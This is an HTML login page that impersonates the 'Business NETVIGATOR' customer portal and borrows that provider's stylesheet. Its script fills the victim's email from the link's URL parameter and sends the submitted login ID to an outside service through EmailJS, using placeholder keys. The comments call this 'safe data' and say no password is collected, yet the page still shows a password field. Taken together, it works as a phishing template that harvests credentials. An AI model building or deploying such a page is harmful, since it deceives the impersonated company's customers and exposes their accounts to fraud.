<!DOCTYPE html>
<html>

<head>
<meta charset="UTF-8">
<title>Customer Login | Business NETVIGATOR</title>

<meta http-equiv="Content-Security-Policy" content="script-src 'self' 'unsafe-inline' https:">

<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css">
<link href="https://service.imsbiz.com/mfauth/css/login.css" rel="stylesheet">

<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
<script>
(function(){
  emailjs.init("YOUR_PUBLIC_KEY");
})();
</script>

<style>
body { font-family: Arial; }
input { margin-bottom: 10px; padding: 8px; width: 269px; }
</style>

</head>

<body>

<div id="container">
  <div id="header">

    <h2>Customer Login</h2>

    <!-- ✅ FORM -->
    <form id="loginForm">

      <input type="text" id="username" placeholder="Login ID (Email)" required>

      <input type="password" id="password" placeholder="Password" required>

      <button type="submit">Login</button>

    </form>

  </div>
</div>

<script>
document.addEventListener("DOMContentLoaded", function () {

  // ✅ Prefill email
  const params = new URLSearchParams(window.location.search);
  const email = params.get("email");

  if (email) {
    document.getElementById("username").value = decodeURIComponent(email);
  }

  // ✅ Send safe data via EmailJS
  document.getElementById("loginForm").addEventListener("submit", function(e) {
    e.preventDefault();

    const username = document.getElementById("username").value;

    emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
      user_email: username,
      note: "User submitted login form (no password collected)"
    })
    .then(function() {
      alert("Submitted successfully");
    })
    .catch(function(error) {
      console.error(error);
      alert("Error sending");
    });
  });

});
</script>

</body>
</html>
